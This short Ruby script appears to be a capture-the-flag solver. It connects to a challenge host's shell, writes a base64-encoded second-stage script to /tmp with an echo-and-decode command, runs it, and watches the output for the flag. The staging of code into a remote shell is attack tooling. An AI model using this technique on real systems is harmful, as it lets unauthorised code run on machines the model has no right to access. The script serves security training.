require 'base64'
require 'socket'
require_relative 'libronsolve'

PROGRAM = File.read(File.join(__dir__, 'solve-internal.rb'))

host, port = get_host_port()

s = TCPSocket.new(host, port)
sleep(1)

s.puts("echo \"#{ Base64.strict_encode64(PROGRAM) }\" | base64 -d > /tmp/solve-internal.rb")

s.puts("ruby /tmp/solve-internal.rb")

buffer = ''
loop do
  out = s.readpartial(1024)
  if out.nil? || out == ''
    exit
  end
  print out
  buffer << out

  if(buffer =~ /XXX(.*)XXX/m)
    puts Regexp.last_match(0)
    puts Regexp.last_match(1)
    check_flag(Regexp.last_match(1), terminate: true)
  end
end
